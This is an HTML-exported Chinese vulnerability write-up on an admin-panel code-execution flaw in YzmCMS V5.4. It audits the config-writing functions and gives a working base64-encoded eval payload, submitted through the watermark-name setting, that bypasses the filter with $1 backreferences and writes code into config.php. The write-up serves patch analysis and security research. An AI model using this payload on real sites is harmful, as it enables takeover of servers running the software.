<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="yzmcms-v54-后台getshell二"><span class="csDE05BCC">YzmCMS V5.4 </span><span class="csECDA2D3">后台</span><span class="csDE05BCC">getshell</span><span class="csECDA2D3">（二）</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">YzmCMS V5.4</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">这个</span><span class="cs8926E06">cms</span><span class="cs9C1B1871">中有一些配置项是写在文件中，也有一些是写在数据库中的，例如上一个漏洞提到的</span><span class="cs9FB05234">mode</span><span class="cs9C1B1871">就是写在文件中，而我们的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">是写在数据库中再进行读取的，为了避免上面手动修改配置文件这一过程，我找到了一个函数可以修改配置文件，但是问题是只能对规定的</span><span class="cs8926E06">4</span><span class="cs9C1B1871">个</span><span class="cs8926E06">key</span><span class="cs9C1B1871">进行修改，所以是不能直接修改</span><span class="cs9FB05234">mode</span><span class="cs9C1B1871">这个</span><span class="cs8926E06">key</span><span class="cs9C1B1871">的。于是我回去查看补丁，发现修改配置的函数也进行了修改。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/YzmCMS/YzmCMS%20V5.4%20%e5%90%8e%e5%8f%b0getshell%ef%bc%88%e4%ba%8c%ef%bc%89_files/image0.png" width="560" height="139" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">该函数位于文件</span><span class="cs9FB05234">application/admin/common/function/function.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">function set_config($config) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$configfile = YZMPHP_PATH.&#39;common&#39;.DIRECTORY_SEPARATOR.&#39;config/config.php&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(!is_writable($configfile)) showmsg(&#39;Please chmod &#39;.$configfile.&#39; to 0777 !&#39;, &#39;stop&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$pattern = $replacement = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;foreach($config as $k=&gt;$v) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pattern[$k] = &quot;/&#39;&quot;.$k.&quot;&#39;\s*=&gt;\s*([&#39;]?)[^&#39;]*([&#39;]?)(\s*),/is&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$replacement[$k] = &quot;&#39;&quot;.$k.&quot;&#39; =&gt; \${1}&quot;.$v.&quot;\${2}\${3},&quot;; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$str = file_get_contents($configfile);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$str = preg_replace($pattern, $replacement, $str);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return file_put_contents($configfile, $str, LOCK_EX); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到，补丁在原来的函数中增加了一行代码，将传入的</span><span class="cs9FB05234">$config</span><span class="cs9C1B1871">中的字符</span><span class="cs9FB05234">,</span><span class="cs9C1B1871">和</span><span class="cs9FB05234">$</span><span class="cs9C1B1871">移除了，而原先就直接经过特定的正则表达式将</span><span class="cs9FB05234">config.php</span><span class="cs9C1B1871">文件中的内容进行替换后再写回去。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">调用这个函数的地方，除了安装的页面就只有</span><span class="cs9FB05234">application/admin/controller/system_manage.class.php</span><span class="cs9C1B1871">中的</span><span class="cs9FB05234">save</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function save() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yzm_base::load_common(&#39;function/function.php&#39;, &#39;admin&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(isset($_POST[&#39;dosubmit&#39;])){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(isset($_POST[&#39;mail_inbox&#39;]) &amp;&amp; $_POST[&#39;mail_inbox&#39;]){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!is_email($_POST[&#39;mail_inbox&#39;])) showmsg(L(&#39;mail_format_error&#39;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(isset($_POST[&#39;upload_types&#39;])){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(empty($_POST[&#39;upload_types&#39;])) showmsg(&#39;</span><span class="cs7FFD2630">允许上传附件类型不能为空！</span><span class="cs9FB05234">&#39;, &#39;stop&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$arr = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config = D(&#39;config&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($_POST as $key =&gt; $value){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(in_array($key, array(&#39;site_theme&#39;,&#39;watermark_enable&#39;,&#39;watermark_name&#39;,&#39;watermark_position&#39;))) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value = safe_replace(trim($value));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$arr[$key] = $value;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($key!=&#39;site_code&#39;){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value = htmlspecialchars($value);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config-&gt;update(array(&#39;value&#39;=&gt;$value), array(&#39;name&#39;=&gt;$key));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;set_config($arr);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delcache(&#39;configs&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;showmsg(L(&#39;operation_success&#39;), &#39;&#39;, 1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs9FB05234">save</span><span class="cs9C1B1871">中，只有</span><span class="cs8926E06">key</span><span class="cs9C1B1871">为</span><span class="cs9FB05234">&#39;site_theme&#39;,&#39;watermark_enable&#39;,&#39;watermark_name&#39;,&#39;watermark_position&#39;</span><span class="cs9C1B1871">的配置项会经过</span><span class="cs9FB05234">safe_replace</span><span class="cs9C1B1871">后传入</span><span class="cs9FB05234">set_config</span><span class="cs9C1B1871">，其他项则是直接在数据库中更新。</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">safe_replace</span><span class="cs9C1B1871">则对一些特殊字符进行了过滤</span></p><p class="cs3A447A38"><span class="cs9FB05234">function safe_replace($string) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string = str_replace(&#39;%20&#39;,&#39;&#39;,$string);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string = str_replace(&#39;%27&#39;,&#39;&#39;,$string);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string = str_replace(&#39;%2527&#39;,&#39;&#39;,$string);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string = str_replace(&#39;*&#39;,&#39;&#39;,$string);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string = str_replace(&#39;&quot;&#39;,&#39;&#39;,$string);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string = str_replace(&quot;&#39;&quot;,&#39;&#39;,$string);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string = str_replace(&#39;;&#39;,&#39;&#39;,$string);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string = str_replace(&#39;&lt;&#39;,&#39;&amp;lt;&#39;,$string);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string = str_replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;,$string);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string = str_replace(&quot;{&quot;,&#39;&#39;,$string);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string = str_replace(&#39;}&#39;,&#39;&#39;,$string);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$string = str_replace(&#39;\\&#39;,&#39;&#39;,$string);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $string;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">审计完代码以后我们可以发现</span><span class="cs8926E06">post</span><span class="cs9C1B1871">过去的值，只有特定的</span><span class="cs8926E06">key</span><span class="cs9C1B1871">会被写入配置文件，而</span><span class="cs8926E06">value</span><span class="cs9C1B1871">不能包含</span><span class="cs9FB05234">safe_replace</span><span class="cs9C1B1871">中的特殊字符，最后</span><span class="cs8926E06">value</span><span class="cs9C1B1871">会被拼接成为</span><span class="cs9FB05234">preg_replace</span><span class="cs9C1B1871">中的第二个参数</span><span class="cs9FB05234">$replacement</span><span class="cs9C1B1871">的一部分。而在</span><span class="cs9FB05234">$replacement</span><span class="cs9C1B1871">中用了</span><span class="cs9FB05234">${1}</span><span class="cs9C1B1871">这样的形式来指定上文匹配到的</span><span class="cs9FB05234">&#39;</span><span class="cs9C1B1871">，虽然</span><span class="cs9FB05234">{}</span><span class="cs9C1B1871">被过滤了，但是</span><span class="cs9FB05234">$1</span><span class="cs9C1B1871">实际上是与</span><span class="cs9FB05234">${1}</span><span class="cs9C1B1871">等价的，因此我们通过这种方式闭合单引号，然后</span><span class="cs9FB05234">,</span><span class="cs9C1B1871">也没有被过滤，所以我们可以在键值对的后面插入别的代码，可惜的是</span><span class="cs9FB05234">&gt;</span><span class="cs9C1B1871">是被过滤的，所以我们无法插入</span><span class="cs9FB05234">key =&gt; value</span><span class="cs9C1B1871">这样的形式来修改项。不过可以直接插入函数，像</span><span class="cs9FB05234">array(0=&gt;1,func())</span><span class="cs9C1B1871">的形式中，</span><span class="cs9FB05234">func</span><span class="cs9C1B1871">是会被执行的，并且将返回值作为</span><span class="cs8926E06">value</span><span class="cs9C1B1871">成为</span><span class="cs8926E06">array</span><span class="cs9C1B1871">的一部分。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">所以只要闭合了单引号，再传递一个</span><span class="cs8926E06">eval</span><span class="cs9C1B1871">过去就可以执行代码了，因为有过滤函数，所以可以再套一层</span><span class="cs8926E06">base64</span><span class="cs9C1B1871">。</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">设置的接口在系统管理的系统设置中的附加设置处。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/YzmCMS/YzmCMS%20V5.4%20%e5%90%8e%e5%8f%b0getshell%ef%bc%88%e4%ba%8c%ef%bc%89_files/image1.png" width="560" height="464" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过上文的分析我们来构建</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">将</span><span class="cs9FB05234">system(&#39;echo 123&#39;);</span><span class="cs8926E06">base64_encode</span><span class="cs9C1B1871">以后为</span><span class="cs9FB05234">c3lzdGVtKCdlY2hvIDEyMycpOw==</span><span class="cs9C1B1871">，套一层</span><span class="cs8926E06">eval</span><span class="cs9C1B1871">并且闭合单引号后</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">为</span></p><p class="cs3A447A38"><span class="cs9FB05234">$1,eval(base64_decode($1c3lzdGVtKCdlY2hvIDEyMycpOw==$1)),$1</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">先查看配置文件原先的内容</span></p><p class="cs40DD2BC9"><span><img src="Web安全/YzmCMS/YzmCMS%20V5.4%20%e5%90%8e%e5%8f%b0getshell%ef%bc%88%e4%ba%8c%ef%bc%89_files/image2.png" width="560" height="160" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">回到页面，</span><span class="cs7FFD2630">水印图片名称</span><span class="cs9C1B1871">就是可用的一个配置项，在这个地方写入我们的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">并提交。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/YzmCMS/YzmCMS%20V5.4%20%e5%90%8e%e5%8f%b0getshell%ef%bc%88%e4%ba%8c%ef%bc%89_files/image3.png" width="560" height="166" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">提交以后可以发现已经成功执行命令了</span></p><p class="cs40DD2BC9"><span><img src="Web安全/YzmCMS/YzmCMS%20V5.4%20%e5%90%8e%e5%8f%b0getshell%ef%bc%88%e4%ba%8c%ef%bc%89_files/image4.png" width="560" height="204" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">再回去查看配置文件可以看到代码也写入了</span></p><p class="cs40DD2BC9"><span><img src="Web安全/YzmCMS/YzmCMS%20V5.4%20%e5%90%8e%e5%8f%b0getshell%ef%bc%88%e4%ba%8c%ef%bc%89_files/image5.png" width="560" height="105" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/7231#toc-5</span></p></body>
</html>
